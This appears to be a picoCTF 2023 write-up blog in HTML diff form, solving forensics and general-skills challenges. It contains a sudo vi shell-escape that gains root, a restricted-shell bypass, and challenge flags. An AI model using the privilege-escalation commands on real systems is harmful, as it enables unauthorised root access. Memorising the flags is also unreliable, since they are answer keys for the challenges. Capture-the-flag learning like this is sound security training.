+</span></span><span class="line"><span class="cl"><span class="ne">Image</span> <span class="n">Height</span>                    <span class="p">:</span> <span class="mi">504</span>
+</span></span><span class="line"><span class="cl"><span class="n">Bit</span> <span class="n">Depth</span>                       <span class="p">:</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="ne">Color</span> <span class="n">Type</span>                      <span class="p">:</span> <span class="n">RGB</span> <span class="n">with</span> <span class="n">Alpha</span>
+</span></span><span class="line"><span class="cl"><span class="n">Compression</span>                     <span class="p">:</span> <span class="n">Deflate</span><span class="o">/</span><span class="n">Inflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Filter</span>                          <span class="p">:</span> <span class="n">Adaptive</span>
+</span></span><span class="line"><span class="cl"><span class="n">Interlace</span>                       <span class="p">:</span> <span class="n">Noninterlaced</span>
+</span></span><span class="line"><span class="cl"><span class="n">Warning</span>                         <span class="p">:</span> <span class="p">[</span><span class="n">minor</span><span class="p">]</span> <span class="n">Trailer</span> <span class="n">data</span> <span class="n">after</span> <span class="n">PNG</span> <span class="n">IEND</span> <span class="n">chunk</span>
+</span></span><span class="line"><span class="cl"><span class="ne">Image</span> <span class="n">Size</span>                      <span class="p">:</span> <span class="mi">512</span><span class="n">x504</span>
+</span></span><span class="line"><span class="cl"><span class="n">Megapixels</span>                      <span class="p">:</span> <span class="mf">0.258</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The warning tells us there is extra data after the image information is done, the PNG IEND chunk.
+We can verify this ourselves with xxd:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xxd flag.png
+</span></span><span class="line"><span class="cl">&lt;...snip...&gt;
+</span></span><span class="line"><span class="cl">00009b20: 0448 2004 02ff 0fe1 93e1 23be c327 2900  .H .......#..&#39;).
+</span></span><span class="line"><span class="cl">00009b30: 0000 0049 454e 44ae 4260 8250 4b03 040a  ...IEND.B`.PK...
+</span></span><span class="line"><span class="cl">00009b40: 0000 0000 001c 136c 5600 0000 0000 0000  .......lV.......
+</span></span><span class="line"><span class="cl">00009b50: 0000 0000 0007 001c 0073 6563 7265 742f  .........secret/
+</span></span><span class="line"><span class="cl">00009b60: 5554 0900 03f7 370d 64f7 370d 6475 780b  UT....7.d.7.dux.
+</span></span><span class="line"><span class="cl">00009b70: 0001 0400 0000 0004 0000 0000 504b 0304  ............PK..
+</span></span><span class="line"><span class="cl">00009b80: 1400 0000 0800 1c13 6c56 656c 5c74 810b  ........lVel\t..
+</span></span><span class="line"><span class="cl">00009b90: 0000 1b0c 0000 0f00 1c00 7365 6372 6574  ..........secret
+</span></span><span class="line"><span class="cl">&lt;...snip...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using binwalk, we can see the segmented data:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ binwalk ./flag.png        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DECIMAL       HEXADECIMAL     DESCRIPTION
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">0             0x0             PNG image, 512 x 504, 8-bit/color RGBA, non-interlaced
+</span></span><span class="line"><span class="cl">41            0x29            Zlib compressed data, compressed
+</span></span><span class="line"><span class="cl">39739         0x9B3B          Zip archive data, at least v1.0 to extract, name: secret/
+</span></span><span class="line"><span class="cl">39804         0x9B7C          Zip archive data, at least v2.0 to extract, compressed size: 2945, uncompressed size: 3099, name: secret/flag.png
+</span></span><span class="line"><span class="cl">42984         0xA7E8          End of Zip archive, footer length: 22
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This can also be separated with binwalk:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ binwalk -D=&#34;.*&#34; ./flag.png 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The output file is a folder titled <code>_flag.png.extracted</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ls -al
+</span></span><span class="line"><span class="cl">total 108
+</span></span><span class="line"><span class="cl">drwxr-xr-x 3 kali kali  4096 Mar 14 17:37 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 3 kali kali  4096 Mar 14 17:28 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 kali kali 43006 Mar 14 17:28 0
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 kali kali     0 Mar 14 17:28 29
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 kali kali 42965 Mar 14 17:28 29-0
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 kali kali  3267 Mar 14 17:28 9B3B
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 kali kali    22 Mar 14 17:28 A7E8
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After the bulk of data, 9B3B, it appears to be compressed information:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ file 9B3B           
+</span></span><span class="line"><span class="cl">9B3B: Zip archive data, at least v1.0 to extract, compression method=store
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Rename it as zip file and unzip:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ mv 9B3B 9B3B.zip &amp;&amp; unzip 9B3B.zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Resulting output is folder secret with yet another flag.png:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ file flag.png 
+</span></span><span class="line"><span class="cl">flag.png: PNG image data, 600 x 50, 16-bit grayscale, non-interlaced
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Opening this image shows our flag.</p>
+<p><img src="/p/picoctf_2023/images/20230314175651.png"
+	width="1290"
+	height="107"
+	srcset="/p/picoctf_2023/images/20230314175651_hu17536430409447541330.png 480w, /p/picoctf_2023/images/20230314175651_hu18409166027791681679.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1205"
+		data-flex-basis="2893px"
+	
+></p>
+<h2 id="general-skills">General Skills
+</h2><h3 id="chrono">chrono
+</h3><blockquote>
+<p>How to automate tasks to run at intervals on linux servers?
+Additional details will be available after launching your challenge instance</p>
+</blockquote>
+<hr>
+<p>For this challenge, we are given a hint toward how linux servers might automate tasks.</p>
+<p>Firstly, we are required to connect to the challenge machine via ssh:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ssh picoplayer@saturn.picoctf.net -p PORT
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The port number is customized to your own launched instances.</p>
+<p>Linux systems are able to automate tasks on regular intervals through the usage of <code>cron</code>. More info can be found on the <a class="link" href="https://man7.org/linux/man-pages/man8/cron.8.html"  target="_blank" rel="noopener"
+    >Linux manual page</a>. The customizable settings for cron jobs can be found in a file called <code>crontab</code>, which is always located in the /etc/ directory. We can check for a crontab file using <code>ls</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">picoplayer@challenge:~$ ls /etc/crontab  
+</span></span><span class="line"><span class="cl">/etc/crontab
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now that we have confirmed it is there, we can output the contents in plaintext using <code>cat</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoplayer@challenge:~$ cat /etc/crontab    
+</span></span><span class="line"><span class="cl"># picoCTF{Sch3DUL7NG_T45K3_L1NUX_7754e199}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="money-ware">money-ware
+</h3><blockquote>
+<p>Flag format: picoCTF{Malwarename}
+The first letter of the malware name should be capitalized and the rest lowercase.
+Your friend just got hacked and has been asked to pay some bitcoins to <code>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</code>. He doesn’t seem to understand what is going on and asks you for advice. Can you identify what malware he’s being a victim of?</p>
+</blockquote>
+<hr>
+<p>In this challenge, we are given a bitcoin address, and information that this address is used to siphon money from an innocent friend&rsquo;s bitcoin wallet. Since blockchain transactions are publicly disclosed, we can view the activity associated with this wallet on a quick Google search.</p>
+<p><a class="link" href="https://www.bitcoinabuse.com"  target="_blank" rel="noopener"
+    >www.bitcoinabuse.com</a> is a website dedicated to tracking bitcoin addresses used in ransomeware and blackmailings, so if our address was used in other previous attacks, we can find reports for our given address.</p>
+<p>Searching this address we see several reports for multiple abuse types. Since we know our friend had been hacked, the abuse type is likely a ransomeware attack. The first report against this address is labeled ransomeware, and provides a link where we might learn more:</p>
+<blockquote>
+<p>More information here: <a class="link" href="https://blog.avira.com/petya-strikes-back/"  target="_blank" rel="noopener"
+    >https://blog.avira.com/petya-strikes-back/</a></p>
+</blockquote>
+<p>The title of the article plainly tells us the malware at play is based on the infamous ransomeware Petya, but we can also follow the link to learn more about it.</p>
+<p>We are told the answer to the flag is the malware involved, so we can submit the flag by inserting &ldquo;Petya&rdquo; into the picoCTF flag format.
+picoCTF{Petya}</p>
+<h3 id="permissions">Permissions
+</h3><blockquote>
+<p>Can you read files in the root file?</p>
+<p>Additional details will be available after launching your challenge instance.</p>
+</blockquote>
+<hr>
+<p>This challenge asks us to read a file in the /root directory. Files located here are typically under the highest access protections possible, requiring only root permissions and rejecting any other non-super user.</p>
+<p>Firstly, we are required to connect to the challenge machine via ssh:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ssh picoplayer@saturn.picoctf.net -p PORT
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The port number is customized to your own launched instances.</p>
+<p>Firstly, we can check our own user privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoplayer@challenge:~$ id  
+</span></span><span class="line"><span class="cl">uid=1000(picoplayer) gid=1000(picoplayer) groups=1000(picoplayer)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see we are not a part of root in any way, uid gid or part of the root group. It is unlikely we can access /root, so it is unsurprising to see we are denied:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoplayer@challenge:/$ cd /root  
+</span></span><span class="line"><span class="cl">-bash: cd: /root: Permission denied
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We need to find a way to elevate our permissions before we can go here.</p>
+<p>A common approach to elevating privileges is to do super-user actions, through the command <code>sudo</code>. Users are often limited in the kinds of sudo actions they can do. We can check what is allowed for our user by typing <code>sudo -l</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoplayer@challenge:/$ sudo -l     
+</span></span><span class="line"><span class="cl">Matching Defaults entries for picoplayer on challenge:  
+</span></span><span class="line"><span class="cl">   env_reset, mail_badpass,  
+</span></span><span class="line"><span class="cl">   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">User picoplayer may run the following commands on challenge:  
+</span></span><span class="line"><span class="cl">   (ALL) /usr/bin/vi
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notably, we can run <code>/usr/bin/vi</code> as any user, including root, as noted by the (ALL). <code>vi</code> is a common text editor used to edit files. Since we are interested in reading the contents of a file, opening the file using <code>vi</code> is enough to tell us what&rsquo;s inside.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoplayer@challenge:/$ sudo vi /root/flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>However, when we do this we don&rsquo;t see anything? This is because even though we know the location of the flag, we are still guessing if it is called flag.txt or something else. We need a way to explore the contents of the /root directory.</p>
+<p>While <code>vi</code> has the main purpose of being a text editor, we can also abuse some of it&rsquo;s other features to obtain an interactive terminal session as user root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo vi -c &#39;:!/bin/bash&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here, we launch vi with <code>sudo vi</code>. With -c flag, we specify a command <code>:!/bin/bash</code> for vi to run on launch.
+Alternatively, we can do this ourselves after launching <code>vi</code>. Simply typing <code>:shell</code> will open a shell session as the current user, in this case, root.</p>
+<p>Now we can access /root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@challenge:~# ls  
+</span></span><span class="line"><span class="cl">root@challenge:~#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Typing <code>ls</code> shows no file in root? The challenge description mentions reading files in root, so surely something must be here:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@challenge:~# ls -a  
+</span></span><span class="line"><span class="cl">.  ..  .bashrc  .flag.txt  .profile
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>By adding -a flag to <code>ls</code> we can see hidden files. There is our flag, under .flag.txt. So, the reason we couldn&rsquo;t find it earlier was because the name was indeed different from what we expected.
+We can revisit to see that, once the proper name is supplied, <code>vi</code> could have been used to view file contents:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoplayer@challenge:~$ sudo vi /root/.flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{uS1ng_v1m_3dit0r_021d10ab}  
+</span></span><span class="line"><span class="cl">~
+</span></span><span class="line"><span class="cl">~
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="repititions">Repititions
+</h3><blockquote>
+<p>Can you make sense of this file? Download the file <a class="link" href="https://artifacts.picoctf.net/c/475/enc_flag"  target="_blank" rel="noopener"
+    >here</a>.</p>
+</blockquote>
+<hr>
+<p>Here we are tasked with making sense of a file. Following the link prompts us to download a file called <code>enc_flag</code>. Enc is almost certainly shorthand for encoded, meaning our flag will probably need to go through some decoding processes.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat enc_flag
+</span></span><span class="line"><span class="cl">VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh  
+</span></span><span class="line"><span class="cl">RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk  
+</span></span><span class="line"><span class="cl">MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW  
+</span></span><span class="line"><span class="cl">VkpEVGxaYVdFMVhSbFZrTTBKVVZXcE9VazFXV2toT1dHUllDbUY2UWpSWk1GWlhWa2RHZEdWRlZs  
+</span></span><span class="line"><span class="cl">aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Dumping the contents in plaintext, we can see that it is clearly not human-readable. A string such as this, ending with =, is very likely encoded with base64. We can use an online decoding tool such as CyberChef to get through this quickly, or we can use the linux command <code>base64</code> to do this as well:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat enc_flag | base64 -d  
+</span></span><span class="line"><span class="cl">VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVX  
+</span></span><span class="line"><span class="cl">bUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdW  
+</span></span><span class="line"><span class="cl">MlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVkM0JUVWpOUk1WWkhOWGRYCmF6QjRZMFZXVkdGdGVFVlhi  
+</span></span><span class="line"><span class="cl">bTkzVDFWT2JsQlVNRXNLCg==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From our cat output we use | to redirect straight to another command, <code>base64</code>. Setting -d means the data will be base64 decoded. Despite this, the data is still unreadable. And we still see it ending in =? It appears the flag has been through multiple layers of encoding. We can decode for multiple rounds through the same method as before:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat enc_flag | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d  
+</span></span><span class="line"><span class="cl">picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_492767d2}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally after 6 rounds of decoding, the flag appears in plaintext.</p>
+<h3 id="special">Special
+</h3><blockquote>
+<p>Don&rsquo;t power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized&hellip; automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That&rsquo;s Special (TM) Start your instance to see connection details.</p>
+<p>Additional details will be available after launching your challenge instance.</p>
+</blockquote>
+<hr>
+<p>When we first enter, we might be inclined to check what is in our home:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Special$ ls  
+</span></span><span class="line"><span class="cl">Is    
+</span></span><span class="line"><span class="cl">sh: 1: Is: not found
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Our ls command is converted to Is, and then fails to execute. Checking a few other commands leads all syntax being altered to similar legitimate words, and all of them starting with capitilization. With our syntax ruined, we cannot execute commands properly! If we attempt to enter a different shell terminal, we receive an interesting rejection:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Special$ bash  
+</span></span><span class="line"><span class="cl">Why go back to an inferior shell?
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>My first thought is if my input is being altered after input but before bash processing, perhaps I can use characters designated to escaping metacharacter interpretation. In bash, the backslash <code>\</code> character is used to escape regular interpretations, and generally treats the character as raw text.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Special$ \ls  
+</span></span><span class="line"><span class="cl">Als    
+</span></span><span class="line"><span class="cl">sh: 1: Als: not found
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Unfortunately, trying to escape the l in <code>ls</code>, which was previously converted to I, produces something completely different. Trying again with other commands, I manage to execute <code>whoami</code>. Perhaps I am on to something?</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Special$ \whoami  
+</span></span><span class="line"><span class="cl">\whoami    
+</span></span><span class="line"><span class="cl">ctf-player
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As it stands currently, we are escaping only 1 character, but the others are still treated as regular components of a string. What if we escape every character?</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Special$ \e\c\h\o test  
+</span></span><span class="line"><span class="cl">\e\c\h\o test    
+</span></span><span class="line"><span class="cl">test
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can successfully perform <code>echo</code>! However, for some strange reason <code>ls</code> is not working:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Special$ \l\s  
+</span></span><span class="line"><span class="cl">Plus    
+</span></span><span class="line"><span class="cl">sh: 1: Plus: not found
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Perhaps the problem is caused by ls being only 2 characters? Regardless, we have other ways to look around:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Special$ \d\i\r  
+</span></span><span class="line"><span class="cl">\d\i\r    
+</span></span><span class="line"><span class="cl">blargh  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">Special$ \c\a\t \b\l\a\r\g\h  
+</span></span><span class="line"><span class="cl">\c\a\t \b\l\a\r\g\h    
+</span></span><span class="line"><span class="cl">cat: blargh: Is a directory
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Special$ \d\i\r \b\l\a\r\g\h  
+</span></span><span class="line"><span class="cl">\d\i\r \b\l\a\r\g\h    
+</span></span><span class="line"><span class="cl">flag.txt  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Special$ \c\a\t \b\l\a\r\g\h\/\f\l\a\g\.\t\x\t  
+</span></span><span class="line"><span class="cl">\c\a\t \b\l\a\r\g\h\/\f\l\a\g\.\t\x\t    
+</span></span><span class="line"><span class="cl">picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>While this approached works, it is rather tedious and ugly. We can escape this special shell by invoking bash:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Special$ \b\a\s\h  
+</span></span><span class="line"><span class="cl">\b\a\s\h    
+</span></span><span class="line"><span class="cl">ctf-player@challenge:~$ whoami  
+</span></span><span class="line"><span class="cl">ctf-player
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we are free!</p>
+<h3 id="specialer">Specialer
+</h3><blockquote>
+<p>Reception of Special has been cool to say the least. That&rsquo;s why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just &lsquo;Specialer&rsquo;. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody&rsquo;s complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer.</p>
